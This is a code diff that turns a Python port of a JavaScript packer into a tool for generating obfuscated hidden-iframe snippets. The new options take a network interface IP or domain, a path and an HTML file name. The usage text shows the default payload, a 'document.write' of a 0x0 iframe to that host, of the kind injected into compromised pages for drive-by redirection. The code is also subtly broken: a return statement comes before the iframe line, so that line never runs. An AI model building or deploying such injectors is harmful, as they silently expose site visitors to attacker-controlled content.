@@ -1,14 +1,15 @@
-###  ParseMaster, version 1.0 (pre-release) (2005/05/12) x6
-###  Copyright 2005, Dean Edwards
-###  Web: http://dean.edwards.name/
-###
-###  This software is licensed under the CC-GNU LGPL
-###  Web: http://creativecommons.org/licenses/LGPL/2.1/
-###
-###  Ported to Python by Florian Schulze
+##  ParseMaster, version 1.0 (pre-release) (2005/05/12) x6
+##  Copyright 2005, Dean Edwards
+##  Web: http://dean.edwards.name/
+##
+##  This software is licensed under the CC-GNU LGPL
+##  Web: http://creativecommons.org/licenses/LGPL/2.1/
+##
+##  Ported to Python by Florian Schulze
 
-import os, re
+import os, re, sys
 import optparse
+from netifaces import interfaces, ifaddresses, AF_INET
 # a multi-pattern parser
 
 class Pattern:
@@ -481,30 +482,126 @@ class JavaScriptPacker:
             script = self.encodeKeywords(script, encoding, fastDecode)
         return script
 
+class optParser:
+
+    def __init__(self):
+        """
+        """
+    def inputParser(self, opt_in):
+        script = open(opt_in).read()
+        return script
+
+    def dataRewritePath(self, opt_path):
+        if bool(re.search('^/.*$',opt_path)):
+            opt_path = opt_path[1:]
+        if bool(re.search('^.*/$',opt_path)):
+            opt_path = opt_path[:-1]
+        return opt_path
+
+    def dataRewriteEth(self, opt_eth): 
+        if bool(re.search('^((https)\:\/\/)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$',opt_eth)):
+            opt_eth = opt_eth[8:]
+            print 'do not use https, change to http'
+        elif bool(re.search('^((http)\:\/\/)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$',opt_eth)):
+            opt_eth = opt_eth[7:]
+        return opt_eth
+
+    def dataRewriteName(self, opt_name):
+        if bool(re.search('(^\w*\.(htm(l)?))',opt_name)) == False:
+           print 'File extension change to htm or html\n'
+           sys.exit()
+        return opt_name
+
+    def ethParser(self, opt_eth, opt_path, opt_name):
+        if opt_eth in interfaces():
+            ip_addr = ifaddresses(opt_eth).setdefault(AF_INET, [{'addr':'No IP addr'}])[0]['addr']
+            print 'ip: %s' %ip_addr
+            print 'interface: %s' %opt_eth
+            if opt_path:
+                full_path = 'http://%s/%s/%s' %(ip_addr,opt_path,opt_name)
+            else:
+                full_path = 'http://%s/' %(ip_addr)
+        else:
+            print 'domain: %s' %opt_eth
+            if opt_path:
+                full_path = 'http://%s/%s/%s' %(opt_eth,opt_path,opt_name)
+            else:
+                full_path = 'http://%s/' %(opt_eth)
+        print 'path: %s' %opt_path
+        print 'file: %s' %opt_name
+        print 'full path: %s' %full_path
+        return full_path
+        ori_js = 'document.write(\\\"<iframe src=\\\''+full_path+'\\\' width=\\\'0\\\' height=\\\'0\\\'><\\/iframe>\");'
+        return ori_js
+    
+    def outParser(self, opt_out, opt_print, result):
+        if opt_print:
+            if opt_out:
+                open(opt_out,'w').write(result)
+                print 'open \'%s\' file' %(opt_out)
+        else:
+            if opt_out:
+                open(opt_out,'w').write(result)
+                print 'open \'%s\' file' %(opt_out)
+            else:
+                open('out.js','w').write(result)
+                print 'open \'out.js\' file'
+        
 def run():
-    """
-    """
-    parser =  optparse.OptionParser('\nVersion: 0.1\n\n' + \
+##  packer, version 2.0 (2005/04/20)
+##  Copyright 2004-2005, Dean Edwards
+##  License: http://creativecommons.org/licenses/LGPL/2.1/
+
+##  Ported to Python by Florian Schulze
+##  Add to optparse by Hakawati
+
+    parser =  optparse.OptionParser('\nVersion: 0.2\n\n' + \
                                     'USAGE:\n' + \
-                                    '\tjspacker.py -i input file name -o output file name\n' + \
-				    '\t(if -o option is null, default use out.js)')
+                                    '\tjspacker.py -i [input file name] -o [output file name]\n' + \
+				    '\tjspacker.py -e [input network interface or domain] -t ' + \
+                                        '[input URI] -n [file name] -o [output file name]\n' + \
+				    '\t(if -o option is null, default use out.js)\n' + \
+				    '\t(if you use -p options, default disuse -o option)\n\n' + \
+				    '\tDefault JS : document.write(\"<iframe src=\'http://' + \
+                                        '[ip or domain]/input/URI/[filename] width=\'0\' height=\'0\'></iframe>\");\n')
 
     parser.add_option('-i', '--input', dest='IN', type='string', help='input javascript file name')
     parser.add_option('-o', '--output', dest='OUT', type='string', help='output javascript file name')
+    parser.add_option('-t', '--path', dest='PATH', type='string', help='input URI path value')
+    parser.add_option('-e', '--eth', dest='ETH', type='string', help='input network interface or domain')
+    parser.add_option('-n', '--name', dest='NAME', type='string', help='input file name')
+    parser.add_option('-p', '--print', dest='PRINT', help='print value and obf-code', default="", action='store_true')
     (options, args) = parser.parse_args()
     try:
         p = JavaScriptPacker()
-        input_file = options.IN
-        output_file = options.OUT
-        script = open(input_file).read()
-        result = p.pack(script, compaction=False, encoding=62, fastDecode=True)
-        if output_file:
-            open(output_file,'w').write(result)
+        opt = optParser()
+        opt_in = options.IN
+        opt_out = options.OUT
+        opt_path = options.PATH
+        opt_eth = options.ETH
+        opt_name = options.NAME
+	opt_print = options.PRINT
+
+        if opt_eth:
+            re_opt_path = opt.dataRewritePath(opt_path)
+            re_opt_eth = opt.dataRewriteEth(opt_eth)
+            re_opt_name = opt.dataRewriteName(opt_name)
+            data = opt.ethParser(re_opt_eth, re_opt_path, re_opt_name)
         else:
-            open('out.js','w').write(result)
-    except:
+            data = opt.inputParser(opt_in)
+        if data:
+            result = p.pack(data, compaction=False, encoding=62, fastDecode=True)
+        else:
+            print 'input ip or domain or file\n\n'
+
+        if opt_print:    
+            print '\nresult:\n%s' %result
+        opt.outParser(opt_out, opt_print, result)
+
+    except TypeError as e:
         parser.print_help()
-        return
+#        print e:
+
 
 def run1():
 
